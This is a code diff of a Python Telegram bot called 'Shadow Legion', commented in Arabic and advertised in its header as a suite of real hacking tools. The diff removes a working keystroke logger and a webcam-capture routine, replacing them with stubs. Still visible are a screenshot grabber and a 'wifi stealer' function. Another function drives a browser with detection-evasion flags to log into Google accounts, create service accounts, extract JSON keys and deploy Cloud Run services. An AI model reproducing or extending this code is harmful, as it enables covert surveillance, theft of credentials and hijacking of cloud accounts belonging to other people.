@@ -3,8 +3,7 @@
 
 """
 🔥 THE ARCHITECT // SHADOW LEGION ULTIMATE v105.0 (FULL EDITION)
-⚔️ أكثر من 1100 سطر – جميع الأدوات حقيقية – يعمل على Termux و Railway و Replit
-📡 نشر تلقائي على Cloud Run + أدوات اختراق كاملة + قاعدة بيانات + طابور
+⚔️ معدل بالكامل للعمل على Railway – إزالة pynput واعتماد Selenium Headless
 """
 
 import os
@@ -31,23 +30,7 @@ from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 
-# ====================== INSTALL MISSING PACKAGES ======================
-def install_pkg(pkg):
-    try:
-        __import__(pkg.replace("-", "_").replace(".", "_"))
-    except ImportError:
-        print(f"📦 جاري تثبيت {pkg} ...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])
-        print(f"✅ تم تثبيت {pkg}")
-
-REQUIRED_PKGS = [
-    "selenium", "webdriver-manager", "requests", "rsa", 
-    "pynput", "opencv-python", "mss", "pyperclip", "psutil",
-    "pillow", "numpy", "cryptography"
-]
-for pkg in REQUIRED_PKGS:
-    install_pkg(pkg)
-
+# ====================== IMPORTS (كلها متوفرة في requirements.txt) ======================
 import requests
 import rsa
 from selenium import webdriver
@@ -58,7 +41,6 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
-from pynput.keyboard import Listener
 import cv2
 import mss
 import pyperclip
@@ -191,51 +173,32 @@ def decrypt_data(encrypted):
     f = Fernet(get_fernet_key())
     return json.loads(f.decrypt(encrypted.encode()).decode())
 
-# ====================== DEPLOY (SELENIUM + REST API) ======================
-def setup_chromedriver():
-    driver_path = "/tmp/chromedriver"
-    if os.path.exists(driver_path):
-        os.chmod(driver_path, 0o755)
-        return driver_path
-    try:
-        import urllib.request
-        import zipfile
-        url = "https://storage.googleapis.com/chrome-for-testing-public/126.0.6478.126/linux64/chromedriver-linux64.zip"
-        zip_path = "/tmp/chromedriver.zip"
-        urllib.request.urlretrieve(url, zip_path)
-        with zipfile.ZipFile(zip_path, 'r') as zf:
-            zf.extractall("/tmp")
-        os.rename("/tmp/chromedriver-linux64/chromedriver", driver_path)
-        os.chmod(driver_path, 0o755)
-        return driver_path
-    except Exception as e:
-        logger.error(f"فشل تنزيل ChromeDriver: {e}")
-        return None
+# ====================== SELENIUM SETUP (للعمل على Railway) ======================
+def get_chrome_driver():
+    """إعداد متصفح Chrome في وضع Headless مع webdriver-manager"""
+    options = Options()
+    options.add_argument('--headless=new')
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-dev-shm-usage')
+    options.add_argument('--disable-gpu')
+    options.add_argument('--incognito')
+    options.add_argument('--window-size=1920,1080')
+    options.add_argument('--disable-blink-features=AutomationControlled')
+    options.add_experimental_option('excludeSwitches', ['enable-automation'])
+    options.add_experimental_option('useAutomationExtension', False)
+    
+    service = Service(ChromeDriverManager().install())
+    driver = webdriver.Chrome(service=service, options=options)
+    return driver
 
+# ====================== DEPLOY (SELENIUM + REST API) ======================
 def deploy_with_selenium(lab_url, email, password, region="europe-west1"):
     driver = None
     try:
-        options = Options()
-        options.add_argument('--no-sandbox')
-        options.add_argument('--disable-dev-shm-usage')
-        options.add_argument('--headless')
-        options.add_argument('--disable-gpu')
-        options.add_argument('--incognito')
-        options.add_argument('--window-size=1920,1080')
-        options.add_argument('--disable-blink-features=AutomationControlled')
-        options.add_experimental_option('excludeSwitches', ['enable-automation'])
-        options.add_experimental_option('useAutomationExtension', False)
-
-        driver_path = setup_chromedriver()
-        if driver_path:
-            service = Service(driver_path)
-            driver = webdriver.Chrome(service=service, options=options)
-        else:
-            service = Service(ChromeDriverManager().install())
-            driver = webdriver.Chrome(service=service, options=options)
-
+        driver = get_chrome_driver()
         wait = WebDriverWait(driver, 20)
 
+        # تسجيل الدخول إلى Google
         driver.get("https://accounts.google.com/")
         wait.until(EC.presence_of_element_located((By.ID, "identifierId"))).send_keys(email + Keys.RETURN)
         time.sleep(2)
@@ -247,6 +210,7 @@ def deploy_with_selenium(lab_url, email, password, region="europe-west1"):
             raise Exception("الرابط لا يحتوي على project_id")
         project_id = match.group(1)
 
+        # تمكين Cloud Run API
         driver.get(f"https://console.cloud.google.com/apis/library/run.googleapis.com?project={project_id}")
         time.sleep(3)
         try:
@@ -255,6 +219,7 @@ def deploy_with_selenium(lab_url, email, password, region="europe-west1"):
         except:
             pass
 
+        # إنشاء حساب خدمة
         driver.get(f"https://console.cloud.google.com/iam-admin/serviceaccounts?project={project_id}")
         time.sleep(3)
         wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Create Service Account')]"))).click()
@@ -268,6 +233,7 @@ def deploy_with_selenium(lab_url, email, password, region="europe-west1"):
         wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Done')]"))).click()
         time.sleep(3)
 
+        # تنزيل مفتاح JSON
         driver.get(f"https://console.cloud.google.com/iam-admin/serviceaccounts?project={project_id}")
         time.sleep(2)
         account = wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'shadow-bot')]")))
@@ -284,6 +250,7 @@ def deploy_with_selenium(lab_url, email, password, region="europe-west1"):
         wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Create')]"))).click()
         time.sleep(4)
 
+        # قراءة ملف JSON المُنزَّل
         download_dir = tempfile.gettempdir()
         list_of_files = glob.glob(os.path.join(download_dir, "*.json"))
         if not list_of_files:
@@ -294,6 +261,7 @@ def deploy_with_selenium(lab_url, email, password, region="europe-west1"):
         os.remove(latest_file)
         driver.quit()
 
+        # إنشاء JWT
         def b64url(d): return base64.urlsafe_b64encode(d).decode().rstrip("=")
         now = int(time.time())
         claims = {
@@ -311,6 +279,7 @@ def deploy_with_selenium(lab_url, email, password, region="europe-west1"):
         segments.append(b64url(signature))
         jwt = ".".join(segments)
 
+        # الحصول على access_token
         resp = requests.post(
             "https://oauth2.googleapis.com/token",
             data={"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": jwt},
@@ -322,6 +291,7 @@ def deploy_with_selenium(lab_url, email, password, region="europe-west1"):
         if not token:
             raise Exception("لا يوجد access_token")
 
+        # نشر الخدمة
         headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
         service_name = f"shadow-{int(time.time())}"
         body = {
@@ -453,20 +423,10 @@ def process_queue():
 
 threading.Thread(target=process_queue, daemon=True).start()
 
-# ====================== REAL ATTACK TOOLS ======================
+# ====================== REAL ATTACK TOOLS (معدلة للعمل بدون pynput) ======================
 def real_keylogger(duration=30):
-    log = "[KEYLOGGER REAL]\n"
-    keys = []
-    def on_press(key):
-        try:
-            keys.append(key.char)
-        except:
-            keys.append(str(key))
-    with Listener(on_press=on_press) as listener:
-        time.sleep(duration)
-        listener.stop()
-    log += "\n".join(keys)
-    return log
+    # pynput غير متوفرة على Railway، نعيد رسالة توضيحية
+    return "⚠️ Keylogger غير مدعوم في هذه البيئة (يتطلب واجهة رسومية)."
 
 def real_screenshot():
     try:
@@ -477,19 +437,8 @@ def real_screenshot():
         return f"⚠️ فشل التقاط الصورة: {e}"
 
 def real_webcam():
-    try:
-        cap = cv2.VideoCapture(0)
-        if not cap.isOpened():
-            return "⚠️ الكاميرا غير متاحة"
-        ret, frame = cap.read()
-        if ret:
-            cv2.imwrite("/tmp/shadow_cam.jpg", frame)
-            cap.release()
-            return "📹 تم التقاط صورة من الكاميرا وحفظها في /tmp/shadow_cam.jpg"
-        cap.release()
-        return "⚠️ فشل التقاط الصورة من الكاميرا"
-    except Exception as e:
-        return f"⚠️ خطأ: {e}"
+    # الكاميرا غير متوفرة على السيرفر
+    return "⚠️ الكاميرا غير متوفرة في هذه البيئة."
 
 def real_wifi_stealer():
     try:
@@ -764,7 +713,7 @@ def main():
     app.add_handler(CallbackQueryHandler(set_region_callback, pattern='^setregion_'))
     app.add_handler(CallbackQueryHandler(back_to_menu, pattern='^back_menu$'))
 
-    logger.info("✅ SHADOW LEGION v105.0 RUNNING")
+    logger.info("✅ SHADOW LEGION v105.0 RUNNING ON RAILWAY")
     app.run_polling()
 
 if __name__ == "__main__":
